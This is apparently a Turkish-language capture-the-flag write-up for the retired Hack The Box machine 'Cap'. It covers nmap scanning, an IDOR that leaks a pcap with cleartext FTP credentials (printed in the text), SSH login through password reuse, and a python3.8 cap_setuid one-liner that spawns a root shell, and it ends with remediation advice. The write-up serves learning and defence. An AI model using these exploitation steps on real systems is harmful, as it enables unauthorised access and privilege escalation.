---
layout: default
title: HTB - Cap Writeup
---

# [HTB] Cap — Makine Çözümü

| Özellik | Detay | 
| :--- | :--- | 
| **Platform** | Hack The Box (Retired) | 
| **Hedef IP** | `10.129.213.109` | 
| **İşletim Sistemi** | Linux | 
| **Zorluk** | Easy | 
| **Zafiyetler** | IDOR, Cleartext Credentials, Linux Capabilities (`cap_setuid`) | 

---

## 1. Keşif ve Ağ Taraması (Reconnaissance)

OpenVPN bağlantısı kurulduktan sonra hedef sistemdeki açık portları ve servisleri tespit etmek için Nmap taraması gerçekleştirildi:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_initial.txt 10.129.213.109
```

Tarama sonucunda 3 adet açık TCP portu tespit edildi:

* **21/tcp** — FTP
* **22/tcp** — SSH
* **80/tcp** — HTTP (Web Uygulaması)

---

## 2. Zafiyet Analizi (Enumeration)

Web uygulaması (`http://10.129.213.109`) üzerinde yapılan incelemelerde şu bulgulara ulaşıldı:

* Ağ yakalama (Security Snapshot) bölümünde kayıtların `/data/2` gibi sıralı ID değerleriyle çağrıldığı fark edildi. URL parametresi manipüle edilerek `/data/0` adresine istek gönderildiğinde **IDOR (Insecure Direct Object Reference)** zafiyeti olduğu ve başka bir kullanıcıya ait geçmiş ağ trafiği (`.pcap`) dosyasına erişilebildiği görüldü.
* İndirilen `0.pcap` dosyası analiz edildiğinde şifrelenmemiş (cleartext) FTP oturum açma bilgileri (`nathan` / `Buck3tH4TF0RM3!`) tespit edildi.

---

## 3. İlk Erişim (Initial Access / Foothold)

Tespit edilen kimlik bilgilerinin parola tekrarı (Password Reuse) nedeniyle SSH servisinde de geçerli olduğu görülerek sisteme ilk erişim sağlandı:

```bash
ssh nathan@10.129.213.109
```

Düşük yetkili `nathan` kullanıcısı ile oturum açıldı ve kullanıcı bayrağı (`user.txt`) okundu:

```bash
cat user.txt
```

---

## 4. Yetki Yükseltme (Privilege Escalation)

Sistemde `root` yetkisine çıkmak için dosya sistemi genelinde tanımlı Linux Capabilities yetkileri kontrol edildi:

```bash
getcap -r / 2>/dev/null
```

Çıktıda `/usr/bin/python3.8` dosyasına `cap_setuid,cap_net_bind_service+eip` yetkisi atandığı tespit edildi. Python yorumlayıcısı üzerinden süreç kullanıcı kimliği (UID) `0` yapılarak tam yetkili kabuk (root shell) elde edildi ve `root.txt` bayrağı okundu:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cd /root
cat root.txt
```

---

## 5. Güvenlik Önerileri (Remediation)

* **Yetkilendirme Kontrolü:** `/data/<id>` uç noktasında sunucu taraflı oturum ve sahiplik doğrulaması (Access Control) uygulanarak IDOR zafiyeti kapatılmalıdır.
* **Şifreli Protokol Kullanımı:** Hassas verilerin düz metin (cleartext) olarak iletilmesini önlemek için FTP yerine SFTP kullanılmalıdır.
* **En Az Yetki İlkesi:** `/usr/bin/python3.8` üzerinden gereksiz olan `cap_setuid` yetkisi `setcap -r /usr/bin/python3.8` komutu ile kaldırılmalıdır.

---

## 6. Tamamlama Kanıtları (HTB Guided Mode & Pwned)

![Cap Makine Özeti ve Keşif](../assets/images/cap/pwned.jpg)

![IDOR ve PCAP Analizi Görevleri](../assets/images/cap/2-pwned.jpg)

![User Flag ve Yetki Yükseltme Görevleri](../assets/images/cap/3-pwned.jpg)

![Root Flag ve Tamamlama Onayı](../assets/images/cap/4-pwned.jpg)

[<- Ana Sayfaya Dön](../index.html)
